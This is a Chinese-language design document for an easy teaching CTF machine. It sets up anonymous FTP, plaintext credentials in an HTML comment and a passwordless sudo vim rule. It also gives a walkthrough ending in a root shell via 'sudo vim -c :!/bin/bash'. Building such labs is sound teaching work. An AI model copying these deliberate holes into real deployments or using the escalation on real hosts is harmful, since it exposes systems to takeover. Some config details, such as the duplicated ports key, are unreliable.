# GDD — CTF 靶機設計文件
# 《老師，你的答案藏不住的》

**版本：** v1.0  
**目標平台：** Docker（支援 ARM64 / Raspberry Pi）  
**預計解題時間：** 15–20 分鐘  
**難度：** Easy  
**設計者：** 數位實驗高中資安課

---

## 一、概覽 Overview

### 核心梗
數位實驗高中的資訊老師 **蔡老師（Mr. Tsai）** 每次考試前都說「答案我絕對不會放在網路上」。
但他其實把期末考答案、成績單、還有自己帳號密碼，全部放在一台「以為學生找不到」的內部伺服器上。
你是班上最強的資安社社員——**證明老師錯了**。

### 玩家目標
找到 **3 個 flag**，集齊後即完成挑戰：

| Flag | 名稱 | 象徵意義 |
|------|------|---------|
| `flag1` | 期中考答案 | 老師忘記關匿名 FTP |
| `flag2` | 蔡老師的密碼 | 藏在網頁原始碼的 HTML comment |
| `flag3` | 期末成績單 | sudo 設定錯誤，root 拿走成績 |

### 教學目標（解完後同學會學到）
1. Port scanning（nmap）
2. Anonymous FTP login
3. Web source code 資訊洩漏
4. SSH brute force / 直接登入
5. sudo misconfiguration → privilege escalation

---

## 二、劇情設計 Story

### 開場文字（部署後顯示在 port 80 首頁）

```
╔══════════════════════════════════════════════════╗
║       數位實驗高中  內部教務系統 v2.3           ║
║       Digital Experimental High School           ║
╠══════════════════════════════════════════════════╣
║                                                  ║
║  本系統僅供教師使用。                            ║
║  學生請勿嘗試存取。                              ║
║                                                  ║
║  — 蔡老師 敬上                                   ║
║  （答案絕對不在這裡，不用找了）                  ║
║                                                  ║
╚══════════════════════════════════════════════════╝
```

### 劇情節點

```
[開始] 同學聽說蔡老師把期末考答案放在某台伺服器
  │
  ▼
[偵查] nmap 掃描 → 發現 port 21(FTP), 22(SSH), 80(HTTP)
  │
  ▼
[FTP] 匿名登入 → 找到 answers_midterm.txt → flag1
  │   （老師以為設密碼，其實 anonymous 沒關）
  ▼
[WEB] 首頁 HTML 原始碼 → 找到老師寫的 comment
  │   <!-- 帳號: tsai  密碼: ILoveProgramming123 -->
  │   → flag2 就藏在這個 comment 旁邊
  ▼
[SSH] 用找到的帳密 SSH 進去 → 成功登入老師帳號
  │
  ▼
[提權] sudo -l → (ALL) NOPASSWD: /usr/bin/vim
  │   用 vim GTFOBins 技巧取得 root shell
  ▼
[終點] cat /root/final_grades.txt → flag3
       老師的成績單全都拿到了 🎉
```

---

## 三、技術規格 Technical Spec

### 服務架構

```
┌─────────────────────────────────────┐
│         Docker Container            │
│                                     │
│  port 21  ─── vsftpd (FTP)         │
│  port 22  ─── OpenSSH              │
│  port 80  ─── Apache2 + PHP        │
│                                     │
│  Users:                             │
│    tsai   (password: 見下方)        │
│    root   (只能透過 sudo 到達)      │
└─────────────────────────────────────┘
```

### 帳號與密碼

| 帳號 | 密碼 | 備註 |
|------|------|------|
| `tsai` | `ILoveProgramming123` | 藏在 HTML comment，也是 SSH 帳號 |
| `ftp anonymous` | （空白） | vsftpd 開啟 anonymous_enable |
| `root` | （不可直接登入） | 透過 sudo vim 提權 |

### Flag 位置

| Flag | 檔案路徑 | 取得方式 |
|------|---------|---------|
| `flag1{midterm_ans_found_lol}` | `/srv/ftp/answers_midterm.txt` | FTP anonymous 下載 |
| `flag2{html_comment_is_not_safe}` | `/var/www/html/index.html` 第 30 行 comment | 看網頁原始碼 |
| `flag3{sudo_vim_goes_brrrr}` | `/root/final_grades.txt` | sudo vim → shell → cat |

---

## 四、漏洞設計 Vulnerability Design

### Vuln 1 — Anonymous FTP（資訊洩漏）

**原理：** vsftpd 預設允許 anonymous 登入，老師以為有設密碼但其實沒擋住匿名。

**vsftpd 設定（`/etc/vsftpd.conf`）：**
```ini
anonymous_enable=YES
anon_root=/srv/ftp
no_anon_password=YES
anon_upload_enable=NO
```

**利用方式：**
```bash
ftp <IP>
# Name: anonymous
# Password: (空白 Enter)
ftp> ls
ftp> get answers_midterm.txt
```

**老師的失誤：** 蔡老師以為改了 FTP 密碼，但 anonymous 是另一個入口，他不知道。

---

### Vuln 2 — HTML Comment 資訊洩漏（Credential Exposure）

**原理：** 開發者把帳密寫在 HTML comment 裡，以為只有「自己看得到」。

**index.html 片段：**
```html
<!-- 
  TODO: 記得把登入功能做完
  測試帳號: tsai
  密碼: ILoveProgramming123
  （做完要刪掉這段！）

  flag2{html_comment_is_not_safe}
-->
```

**利用方式：**
```bash
curl http://<IP>/
# 或瀏覽器 Ctrl+U 看原始碼
```

---

### Vuln 3 — sudo vim 提權（GTFOBins）

**原理：** `tsai` 被允許以 root 身份執行 vim，但 vim 內建 shell 逃脫功能。

**`/etc/sudoers` 設定：**
```
tsai ALL=(root) NOPASSWD: /usr/bin/vim
```

**利用方式（GTFOBins vim）：**
```bash
sudo vim -c ':!/bin/bash'
# 進入 vim 後輸入
:!/bin/bash
# 現在是 root shell
cat /root/final_grades.txt
```

**老師的失誤：** 蔡老師想讓自己可以用 vim 編輯系統設定，但不知道 vim 可以開 shell。

---

## 五、檔案結構 File Structure

Claude Code 需要產生以下檔案：

```
ctf-machine/
├── Dockerfile
├── docker-compose.yml
├── README.md                    # 部署說明
│
├── config/
│   ├── vsftpd.conf              # FTP 設定（開啟 anonymous）
│   ├── sshd_config              # SSH 設定（允許密碼登入）
│   └── sudoers                  # tsai 可以 sudo vim
│
├── web/
│   └── index.html               # 首頁（含 flag2 在 comment）
│
├── ftp/
│   └── answers_midterm.txt      # flag1 在這裡
│
└── root_files/
    └── final_grades.txt         # flag3 在這裡（只有 root 可讀）
```

---

## 六、Dockerfile 規格

```dockerfile
# 基底：使用 debian:bookworm-slim（ARM64 + x86_64 都支援）
FROM debian:bookworm-slim

# 安裝服務
RUN apt-get update && apt-get install -y \
    vsftpd \
    openssh-server \
    apache2 \
    vim \
    sudo \
    && rm -rf /var/lib/apt/lists/*

# 建立使用者 tsai
RUN useradd -m -s /bin/bash tsai && \
    echo "tsai:ILoveProgramming123" | chpasswd

# 設定 FTP
COPY config/vsftpd.conf /etc/vsftpd.conf
RUN mkdir -p /srv/ftp && chmod 755 /srv/ftp
COPY ftp/answers_midterm.txt /srv/ftp/answers_midterm.txt

# 設定 SSH
RUN mkdir /var/run/sshd
COPY config/sshd_config /etc/ssh/sshd_config

# 設定網頁
COPY web/index.html /var/www/html/index.html

# 設定 sudo
COPY config/sudoers /etc/sudoers
RUN chmod 440 /etc/sudoers

# 放 flag3（只有 root 可讀）
COPY root_files/final_grades.txt /root/final_grades.txt
RUN chmod 600 /root/final_grades.txt

# 啟動腳本
COPY start.sh /start.sh
RUN chmod +x /start.sh

EXPOSE 21 22 80

CMD ["/start.sh"]
```

---

## 七、啟動腳本 start.sh

```bash
#!/bin/bash
# 同時啟動三個服務

service apache2 start
service ssh start
/usr/sbin/vsftpd /etc/vsftpd.conf &

# 讓 container 保持運行
tail -f /dev/null
```

---

## 八、docker-compose.yml

```yaml
version: '3.8'
services:
  ctf-machine:
    build: .
    container_name: deh-ctf
    ports:
      - "21:21"
      - "22:22"
      - "80:80"
    restart: unless-stopped
    # FTP passive mode ports
    ports:
      - "21:21"
      - "22:22"
      - "80:80"
      - "21100-21110:21100-21110"
```

---

## 九、解題流程（完整 walkthrough，給老師用）

### Step 1 — 掃描
```bash
nmap -sV -sC <樹莓派IP>
# 發現 port 21, 22, 80
```

### Step 2 — FTP Anonymous（flag1）
```bash
ftp <IP>
# anonymous / (空白)
ftp> get answers_midterm.txt
cat answers_midterm.txt
# → flag1{midterm_ans_found_lol}
```

### Step 3 — 網頁原始碼（flag2）
```bash
curl http://<IP>/
# 或 瀏覽器 Ctrl+U
# 找到 HTML comment → flag2 + 帳密
```

### Step 4 — SSH 登入
```bash
ssh tsai@<IP>
# 密碼: ILoveProgramming123
```

### Step 5 — 提權拿 flag3
```bash
sudo -l
# 看到 (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
# 在 vim 內輸入 :!/bin/bash
cat /root/final_grades.txt
# → flag3{sudo_vim_goes_brrrr}
```

---

## 十、部署指令（README 給學生看的）

```bash
# 1. Clone 或下載專案
git clone <repo>
cd ctf-machine

# 2. 啟動靶機
docker compose up -d

# 3. 查看靶機 IP
# 如果是樹莓派，直接用樹莓派的 IP
hostname -I

# 4. 開始挑戰！
# 目標：找到 3 個 flag
# flag 格式：flag{...}
```

---

## 十一、注意事項（給 Claude Code）

1. **ARM64 相容性**：Dockerfile 基底用 `debian:bookworm-slim`，這個 image 原生支援 `linux/arm64` 和 `linux/amd64`，不需要 QEMU。

2. **FTP passive mode**：vsftpd 在 Docker 裡需要設定 `pasv_address` 和 `pasv_min_port`/`pasv_max_port`，否則 `ls` 指令會 hang 住。需要在 vsftpd.conf 加：
   ```
   pasv_enable=YES
   pasv_min_port=21100
   pasv_max_port=21110
   pasv_address=0.0.0.0
   ```

3. **SSH 需要允許密碼登入**：預設 Debian 的 sshd 可能只允許 key，需要在 sshd_config 設定 `PasswordAuthentication yes`。

4. **sudoers 格式**：用 `visudo` 語法，一定要 `chmod 440`，否則 sudo 會拒絕。

5. **flag 格式一致**：所有 flag 統一用小寫 + 底線，格式 `flag{...}`。

6. **Container 不能用 `systemd`**：所以服務啟動用 `service xxx start` 或直接執行 daemon，不能用 `systemctl`。